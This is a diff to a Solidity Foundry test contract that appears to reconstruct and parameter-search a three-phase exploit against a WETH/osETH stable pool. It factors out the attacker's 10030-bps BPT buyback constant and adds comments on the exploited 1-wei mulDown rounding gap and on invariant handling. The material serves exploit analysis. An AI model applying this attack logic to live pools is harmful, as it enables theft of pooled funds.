@@ -33,6 +33,14 @@ contract SearchParams is Test {
     address internal constant WETH_ADDR = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
     address internal constant OSETH_ADDR = 0xf1C9acDc66974dFB6dEcB12aA385b9cD01190E38;
 
+    /// @notice Attacker's Phase 3 BPT buyback target, in basis points of getActualSupply().
+    /// Source: attacker contract storage slot[0x33] = 10030 (= 100.3%). The 30 bps margin
+    /// over 100% covers (a) full BPT debt liquidation against the post-cycle deflated pool
+    /// and (b) the 1-wei rounding gap from BaseGeneralPool._swapGivenOut's mulDown that
+    /// this PoC exploits. Used as `totalBPT * BPT_TARGET_BPS / 10000` at every Phase 3
+    /// call site (5 occurrences) so any change here propagates everywhere.
+    uint256 internal constant BPT_TARGET_BPS = 10030;
+
     uint256 internal amp;
     uint256 internal swapFeePercentage;
     uint256 internal protocolSwapFeePercentage; // protocol swap fee cache (50% = 5e17)
@@ -479,7 +487,10 @@ contract SearchParams is Test {
         uint256 bO = balOSETH;
         uint256 supply = virtualSupply;
         // Track stored invariant for between-swap protocol fees.
-        // Use the post-Phase2 stored invariant (threaded from cycling's last swap).
+        // initialStoredInvariant is Phase 1's last `_lastPostJoinExitInvariant`: Phase 2
+        // token↔token swaps go through `_onRegularSwap` which is `private view` and
+        // therefore CANNOT update the slot, so Phase 3's first `_beforeJoinExit` reads
+        // exactly what Phase 1's last BPT swap wrote via `_updatePostJoinExit`.
         uint256 storedInvariant = initialStoredInvariant;
         for (uint256 i = 0; i < swapCount; i++) {
             uint256 preInvariant = _getInvariant(bW, bO);
@@ -855,9 +866,9 @@ contract SearchParams is Test {
         // The pool loses (2*remain - sumAfter) tokens during cycling, which flow to the attacker.
         // This is a GAIN for the attacker, not a cost.
         uint256 cyclingGain = sumAfter < 2 * remain ? 2 * remain - sumAfter : 0;
-        // Step 2 (cycling) doesn't involve BPT, so virtualSupply stays at postStep1Supply
-        // Use the real attack's bptTarget = actualSupply * 10030 / 10000 (not bptSold)
-        uint256 bptTarget = totalBPT * 10030 / 10000;
+        // Step 2 (cycling) doesn't involve BPT, so virtualSupply stays at postStep1Supply.
+        // bptTarget uses the attacker's overshoot constant (BPT_TARGET_BPS), not bptSold.
+        uint256 bptTarget = totalBPT * BPT_TARGET_BPS / 10000;
         // Phase 2 token↔token swaps don't update storedInvariant, so Phase 3 uses Phase 1's last postInv
         uint256 repaymentCost = _simulateStep3Repayment(wAfter, oAfter, bptTarget, postStep1Supply, phase1Invariant);
         if (tokensExtracted + cyclingGain < repaymentCost) return 0; // net loss
@@ -1132,7 +1143,7 @@ contract SearchParams is Test {
 
         // Step 3: simulate buying back BPT with dynamic D recovery
         // Phase 3 reads _lastPostJoinExitInvariant from Phase 1 (Phase 2 didn't update it)
-        uint256 bptTarget = totalBPT * 10030 / 10000;
+        uint256 bptTarget = totalBPT * BPT_TARGET_BPS / 10000;
         console.log("--- Step 3 ---");
         console.log("bptTarget:", bptTarget);
         uint256 repaymentCost = _simulateStep3RepaymentDebug(balWETH, balOSETH, bptTarget, postStep1Supply, phase1Inv);
@@ -1390,7 +1401,7 @@ contract SearchParams is Test {
         console.log("Step2 cyclingGain:", cyclingGain);
 
         // Step 3 — uses Phase 1's lastPostJoinExitInvariant
-        uint256 bptTarget = totalBPT * 10030 / 10000;
+        uint256 bptTarget = totalBPT * BPT_TARGET_BPS / 10000;
         console.log("Step3 bptTarget:", bptTarget);
         console.log("Step3 postStep1Supply:", postStep1Supply);
         uint256 repaymentCost = _simulateStep3RepaymentDebug(bW, bO, bptTarget, postStep1Supply, phase1Inv);
@@ -1792,7 +1803,7 @@ contract SearchParams is Test {
         // Step 3: BPT buyback (per-token costs) - use debug version for per-step logging
         // Use minimum bptTarget = minBuyback - warmupSum - 2 to test if attack still succeeds
         // uint256 bptTarget = 11838483978630598473877;
-        uint256 bptTarget = totalBPT * 10030 / 10000;
+        uint256 bptTarget = totalBPT * BPT_TARGET_BPS / 10000;
         (uint256 wethCostStep3, uint256 osethCostStep3, uint256 bptBought) =
             _simulateStep3RepaymentDetailedWithLog(bW, bO, bptTarget, postStep1Supply, phase1Invariant);
         console.log("--- Step 3: BPT Buyback ---");
@@ -2063,8 +2074,8 @@ contract SearchParams is Test {
         console.log("Simulation BPT sold (Phase 1):", bptSold);
 
         // Compare with attacker's bptTarget formula
-        uint256 bptTarget = totalBPT * 10030 / 10000;
-        console.log("Attacker bptTarget (actualSupply*10030/10000):", bptTarget);
+        uint256 bptTarget = totalBPT * BPT_TARGET_BPS / 10000;
+        console.log("Attacker bptTarget (actualSupply*BPT_TARGET_BPS/10000):", bptTarget);
         console.log("actualSupply:", totalBPT);
 
         // Warmup sum from _generateStep3Amounts
